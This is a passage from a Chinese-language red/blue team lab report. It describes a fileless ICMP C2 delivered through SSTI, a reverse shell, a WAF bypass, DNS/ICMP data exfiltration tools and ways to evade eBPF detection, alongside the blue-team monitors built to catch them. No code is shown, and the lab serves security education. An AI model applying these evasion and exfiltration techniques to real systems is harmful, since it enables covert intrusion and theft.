| T1059.006 | Reverse Shell fd Hijack | `sys_enter_dup2` / `sys_enter_dup3` | v2 | `blue_ebpf_mdr_v2.py` |
| T1070 | Indicator Removal | `/proc/*/exe` 冷啟動掃描 memfd 程序 | v1/v2 | `blue_ebpf_mdr*.py` |

---

## 7. 安全考量與限制

### 7.1 AES-256-CTR 的安全特性與注意事項

**強度**:
- AES-256 具有 2^256 金鑰空間，暴力破解計算上不可行
- CTR 模式的隨機 IV 確保語義安全性
- 透過 OpenSSL libcrypto 實作，經過廣泛審計

**注意事項**:
- CTR 模式不提供**完整性保護**（不像 GCM 模式）
- 如果 IV 重複，安全性會降級（本實作使用 `os.urandom(16)` 確保隨機性）
- 在需要完整性驗證的場景中，建議使用 AES-256-GCM 或 ChaCha20-Poly1305

### 7.2 ICMP 通道的頻寬限制
- 每個 ICMP 封包 payload 約 480 bytes
- 加上 jitter 延遲，實際吞吐量極低
- 不適合大量資料外洩，適合命令/控制
- 大量資料外洩需改用 DNS/ICMP exfil 通道（`exfil_agent.py`）

### 7.3 eBPF 偵測的繞過可能性
- 攻擊者可使用 `shm_open()` 代替 `memfd_create`（需額外 hook）
- 攻擊者可使用 `fexecve()` 代替 execve + /proc 路徑
- 更進階: 使用 `ptrace` 注入已有程序（不需 execve）
- 反向 Shell 可使用非標準埠（dup2/dup3 行為偵測仍有效）
- 解決方案: 持續增加 hook 點，結合 seccomp-BPF 與 LSM hook

### 7.4 網路層防禦的固有限制
- IP 封鎖可透過 IP alias、VPN、代理繞過
- 蜜罐只能偵測主動偵察行為
- 解決方案: 與核心層 eBPF 偵測結合，形成縱深防禦

### 7.5 Lab vs 實際環境
- 本 Lab 假設 Flask 以 root 運行（提供 CAP_NET_RAW 給 ICMP raw socket）
- 實際場景中 Web 服務通常以低權限使用者運行
- ICMP raw socket 需要額外的權限提升步驟
- 本專案刻意排除權限提升 (Privilege Escalation) 與破壞性操作 (Impact)，控制爆炸半徑

---

## 8. 完整工具清單

### 紅軍工具

| 工具 | 檔案路徑 | 用途 | MITRE ATT&CK |
|------|---------|------|-------------|
| Fileless ICMP C2 | `red_team/red_attacker.py` | 主攻擊：SSTI → memfd → AES-256-CTR ICMP C2 | T1190, T1620, T1095, T1027 |
| TCP Reverse Shell | `red_team/red_reverse_shell.py` | eBPF v1 繞過：TCP 反向 Shell | T1059.006, T1095, T1571 |
| WAF Bypass Exploit | `red_team/exploit.py` | 備用攻擊：Base64 + ${IFS} WAF bypass | T1190, T1027 |
| Exfil Agent | `red_team/exfil_agent.py` | 靶機端：資料蒐集 + DNS/ICMP 外傳 | T1005, T1048.003 |
| Exfil Listener | `red_team/exfil_listener.py` | 攻擊機端：DNS/ICMP 資料接收器 | T1048.003 |
| Recon Script | `red_team/recon.sh` | nmap 自動化偵察 | T1595 |
| IP Switch | `red_team/ip_switch.sh` | IP alias 管理（繞過網路 MDR） | Defense Evasion |
| Deploy Agent | `red_team/deploy_agent.sh` | 一鍵生成 exfil agent 部署指令 | T1059.006 |
| Post-Exploit | `red_team/post_exploit.sh` | 後滲透情報蒐集 | T1082 |

### 藍軍工具

| 工具 | 檔案路徑 | 用途 | 偵測層級 |
|------|---------|------|---------|
| eBPF MDR v1 | `blue_team/blue_ebpf_mdr.py` | 3 hook: memfd_create + execve + socket | 核心層 |
| eBPF MDR v2 | `blue_team/blue_ebpf_mdr_v2.py` | 6 hook: v1 + connect + dup2 + dup3 | 核心層 |
| Network MDR | `blue_team/blue_mdr_network.py` | trap.log 監控 + iptables 自動封鎖 | 網路層 |
| SOC Dashboard | `blue_team/soc_dashboard.py` | 即時 SOC 網頁儀表板 (SSE) | 可視化 |

### 靶機/誘餌

| 工具 | 檔案路徑 | 用途 | Port |
|------|---------|------|------|
| Vulnerable API | `target/target_app.py` | Flask SSTI 漏洞服務 | 9999 |
| SSH Honeypot | `target/honeypot.py` | 假 SSH 蜜罐陷阱 | 2222 |

---

## 9. 結論

本專案展示了一個完整的多回合 Kill Chain 攻防循環，涵蓋從偵察到資料外洩的完整攻擊生命週期，以及從網路欺敵到核心層行為偵測的多層防禦體系。核心洞見:

1. **沒有單一防禦是足夠的**: 網路層防禦（蜜罐、防火牆）可透過更換 IP 繞過；核心層防禦（eBPF v1）可透過使用不同系統呼叫繞過。只有多個獨立偵測機制的組合才能提供穩健的防護。

2. **攻擊者會適應，防禦者必須進化**: 當 eBPF v1 阻擋了無檔案 ICMP C2 後，紅隊轉向不涉及任何被監控系統呼叫的 TCP 反向 Shell。藍隊透過部署帶有 `connect()` 和 `dup2()`/`dup3()` 額外 hook 的 eBPF v2 來回應。這個循環反映了真實世界的安全營運。

3. **行為偵測超越加密**: 將 C2 通道加密從 XOR 升級到 AES-256-CTR 使得 payload 檢查變得不可能，但 eBPF 偵測仍然完全有效，因為它監控的是系統呼叫行為（程序做了什麼），而非流量內容。

4. **營運可視化至關重要**: SOC 儀表板提供跨所有防禦元件的統一態勢感知，使藍隊能理解完整的攻擊圖像，而非對孤立的警報做出反應。

5. **無檔案技術挑戰傳統防禦**: 透過 `memfd_create` 完全在記憶體中執行，C2 agent 不留下任何檔案系統痕跡。這驗證了透過 eBPF 等技術進行核心層行為監控的必要性。

6. **隱蔽通道無處不在**: ICMP、DNS 等被認為「安全」的協定都可被武器化為 C2 或資料外洩通道。防禦方不能僅依賴 TCP/UDP 層級的監控。

本專案成功實作了涵蓋 7 項 MITRE ATT&CK 攻擊戰術的 15 項攻擊技術，以及橫跨網路層與核心層的 7 項偵測能力，在受控、可重現的環境中為學生提供攻擊與防禦網路安全作業的完整實務經驗。
